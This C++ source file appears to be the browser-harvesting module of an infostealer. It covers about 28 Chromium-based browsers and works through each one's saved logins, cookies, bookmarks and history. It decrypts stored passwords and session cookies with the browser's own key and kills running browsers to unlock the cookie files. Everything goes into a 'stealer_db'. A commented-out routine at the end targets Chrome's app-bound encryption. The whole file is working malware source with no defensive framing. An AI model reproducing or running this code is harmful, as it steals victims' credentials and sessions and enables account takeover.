#include "includes\ChromiumParser.h"

std::string chromium_paths = "AppData\\Local\\";
std::vector<std::string> browsers_chromium = {
	"Microsoft\\Edge\\",
	"Google\\Chrome\\",
	"Opera Software\\Opera Stable", //Diff, in Roaming
	"Iridium\\",
	"Chromium\\",
	"BraveSoftware\\Brave-Browser\\",
	"CentBrowser\\",
	"Chedot\\",
	"Orbitum\\",
	"Comodo\\Dragon\\",
	"Yandex\\YandexBrowser\\",
	"7Star\\7Star\\",
	"Torch\\",
	"MapleStudio\\ChromePlus\\",
	"Kometo\\",
	"Amigo\\",
	"Sputnik\\Sputnik\\",
	"CatalinaGroup\\Citrio\\",
	"360Chrome\\Chrome\\",
	"uCozMedia\\Uran\\",
	"liebao\\",
	"Elements Browser\\",
	"Epic Privacy Browser\\",
	"CocCoc\\Browser\\",
	"Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
	"QIP Surf\\",
	"Coowon\\Coowon\\",
	"Vivaldi\\"
};

BOOL chromium_parser(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_login_data;
	std::string target_key_data;

	// Those paths that contains '\\' at the end means they have the default file 'User Data'
	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if(dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_login_data = target_user_data + "\\Default\\Login Data";
		target_key_data = target_user_data + "\\Local State";

		try {
			sqlite3_stmt* stmt = query_database(target_login_data, "SELECT origin_url, username_value, password_value FROM logins");
			
			if (stmt == nullptr)
				continue;

			//Decrypt Key
			ChromiumDecryptor obj;
			if (obj.ChromiumDecryptorInit(target_key_data))
			{
				while (sqlite3_step(stmt) == SQLITE_ROW)
				{
					DataHolder data;

					char* url = (char*)sqlite3_column_text(stmt, 0);
					char* username = (char*)sqlite3_column_text(stmt, 1);
					//char* password = (char*)sqlite3_column_text(stmt, 2);					

					std::vector<BYTE> password;
					const void* password_blob = sqlite3_column_blob(stmt, 2);
					int password_blob_size = sqlite3_column_bytes(stmt, 2);

					if (url != nullptr && username != nullptr && password_blob != nullptr && password_blob_size > 0) {
						// Assign the BLOB data to the std::vector<BYTE>
						password.assign((const BYTE*)password_blob, (const BYTE*)password_blob + password_blob_size);

						if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
							continue;

						data.get_password_manager().setUrl(url);
						data.get_password_manager().setUsername(username);
						data.get_password_manager().setHost(dir);

						try
						{
							//decrypt password here
							std::string decrypted_password = obj.AESDecrypter(password);
							data.get_password_manager().setPassword(decrypted_password);
						}
						catch(int e)
						{
							continue;
						}

						data_list.push_back(data);
					}
					else {
						// Handle the case where the password_blob is null (no data)
						continue;
					}
				}
			}
			else
			{
				continue;
			}
		}
		catch (int e)
		{
			continue;
		}		
	}

	if (!dump_password_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_cookie_data;
	std::string target_key_data;

	// Those paths that contains \\ at the end means they have the default file 'User Data'
	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";
		target_key_data = target_user_data + "\\Local State";

		try {
			sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");

			if (stmt == nullptr)
			{
				// cookies file is locked when chromium based browser is running
				if (!kill_process(dir))
					continue;

				stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
				
				if (stmt == nullptr)
				{
					continue;
				}
			}

			//Decrypt key
			ChromiumDecryptor obj;
			if (obj.ChromiumDecryptorInit(target_key_data))
			{
				while (sqlite3_step(stmt) == SQLITE_ROW)
				{
					DataHolder data;

					char* host_key = (char*)sqlite3_column_text(stmt, 0);
					char* name = (char*)sqlite3_column_text(stmt, 1);

					std::vector<BYTE> cookies;
					const void* encrypted_value = sqlite3_column_blob(stmt, 3);
					int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
					char* expiry = (char*)sqlite3_column_text(stmt, 4);

					if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
						// Assign the BLOB data to the std::vector<BYTE>
						cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);

						if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
							continue;

						try
						{
							//decrypt cookies here
							std::string decrypted_cookies = obj.AESDecrypter(cookies);

							if (decrypted_cookies.empty())
								continue;

							if (decrypted_cookies.size() > 32) {
								decrypted_cookies.erase(0, 32);  // Remove the first 32 bytes
							}

							data.get_cookies_manager().setCookies(decrypted_cookies);
							data.get_cookies_manager().setUrl(host_key);
							data.get_cookies_manager().setCookieName(name);
							data.get_cookies_manager().setHost(dir);
							data.get_cookies_manager().setCookiesExpiry(expiry);
						}
						catch (int e)
						{
							continue;
						}

						data_list.push_back(data);
					}
					else {
						// Handle the case where the cookies_blob is null (no data)
						continue;
					}
				}
			}
			else
			{
				continue;
			}
		}
		catch (int e)
		{
			continue;
		}
	}

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_bookmark_data;

	// Those paths that contains '\\' at the end means they have the default file 'User Data'
	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_bookmark_data = target_user_data + "\\Default\\Bookmarks";
		std::filesystem::path json_path(target_bookmark_data);

		// Check if the file exists and is a regular file
		if (!std::filesystem::exists(json_path) || !std::filesystem::is_regular_file(json_path)) {
			continue;
		}

		// Open the file using ifstream
		std::ifstream file(json_path);
		if (!file.is_open()) {
			std::cerr << "Error Opening Bookmarks file " << std::endl;  // Print specific error message
			continue;
		}

		json j;
		file >> j;
		file.close();

		DataHolder data;
		try {
			for (const auto& child : j["roots"]["bookmark_bar"]["children"]) {
				if (child.contains("type") && child["type"] == "url") {
					data.get_bookmarks_manager().setDateAdded(child.value("date_added", ""));
					data.get_bookmarks_manager().setName(child.value("name", ""));
					data.get_bookmarks_manager().setType(child.value("type", ""));
					data.get_bookmarks_manager().setUrl(child.value("url", ""));
					data.get_bookmarks_manager().setHost(dir);

					data_list.push_back(data);
				}
			}
		}
		catch (int e)
		{
			continue;
		}
	}

	if (!dump_bookmark_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL chromium_history_collector(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_history_data;

	// Those paths that contains \\ at the end means they have the default file 'User Data'
	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_history_data = target_user_data + "\\Default\\History";

		try {
			sqlite3_stmt* stmt = query_database(target_history_data, "SELECT url, title, visit_count, last_visit_time FROM urls");

			if (stmt == nullptr)
			{
				continue;
			}

			while (sqlite3_step(stmt) == SQLITE_ROW)
			{
				DataHolder data;

				char* url = (char*)sqlite3_column_text(stmt, 0);
				char* title = (char*)sqlite3_column_text(stmt, 1);
				char* visit_count = (char*)sqlite3_column_text(stmt, 2);
				char* last_visit_time = (char*)sqlite3_column_text(stmt, 3);

				if (url != nullptr && title != nullptr) {

					if ((strlen(url) == 0) || (strlen(title) == 0))
						continue;


					data.get_history_manager().setUrl(url);
					data.get_history_manager().setTitle(title);
					data.get_history_manager().setVisitCount(visit_count);
					data.get_history_manager().setLastVisitTime(last_visit_time);
					data.get_history_manager().setHost(dir);

					data_list.push_back(data);
				}
				else {
					continue;
				}
			}
		}
		catch (int e)
		{
			continue;
		}
	}

	if (!dump_history_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

//BOOL chrome_cookie_collector_app_bound_decryption(std::string username, std::string stealer_db)
//{
//	//Target google chrome
//	std::string target_browser = "Google\\Chrome\\";
//
//	//Retrieve Chromium App Bound Encryption Key
//	std::string app_bound_key = retrieve_chrome_key();
//	//----------------------------------------------------------------------------------------------------------------------------------------
//	std::vector<DataHolder> data_list;
//
//	std::string target_user_data;
//	std::string target_cookie_data;
//	std::string target_key_data;
//	
//	target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + target_browser + "User Data";
//	target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";
//	//target_key_data = target_user_data + "\\Local State";
//
//	try {
//		sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
//
//		if (stmt == nullptr)
//		{
//			// cookies file is locked when chromium based browser is running
//			if (!kill_process(target_browser))
//				return false;
//
//			stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
//			if (stmt == nullptr)
//			{
//				return false;
//			}
//		}
//
//		ChromiumDecryptor obj;
//		if (obj.ChromiumAppBoundDecryptorInit(app_bound_key))
//		{
//			while (sqlite3_step(stmt) == SQLITE_ROW)
//			{
//				DataHolder data;
//
//				char* host_key = (char*)sqlite3_column_text(stmt, 0);
//				char* name = (char*)sqlite3_column_text(stmt, 1);
//
//				std::vector<BYTE> cookies;
//				const void* encrypted_value = sqlite3_column_blob(stmt, 3);
//				int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
//				char* expiry = (char*)sqlite3_column_text(stmt, 4);
//
//				if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
//					// Assign the BLOB data to the std::vector<BYTE>
//					cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);
//
//					if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
//						continue;
//
//					try
//					{
//						//decrypt cookies here
//						std::string decrypted_cookies = obj.AESDecrypterAppBound(cookies);
//
//						if (decrypted_cookies.empty())
//							continue;
//
//						data.get_cookies_manager().setCookies(decrypted_cookies);
//						data.get_cookies_manager().setUrl(host_key);
//						data.get_cookies_manager().setCookieName(name);
//						data.get_cookies_manager().setHost(target_browser);
//						data.get_cookies_manager().setCookiesExpiry(expiry);
//					}
//					catch (int e)
//					{
//						continue;
//					}
//
//					data_list.push_back(data);
//				}
//				else {
//					// Handle the case where the cookies_blob is null (no data)
//					continue;
//				}
//			}
//		}
//		else
//		{
//			return false;
//		}
//	}
//	catch (int e)
//	{
//		return false;
//	}
//
//	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
//		return false;
//
//	//std::cout << "stealer_db path: " << stealer_db << std::endl;
//	return true;
//}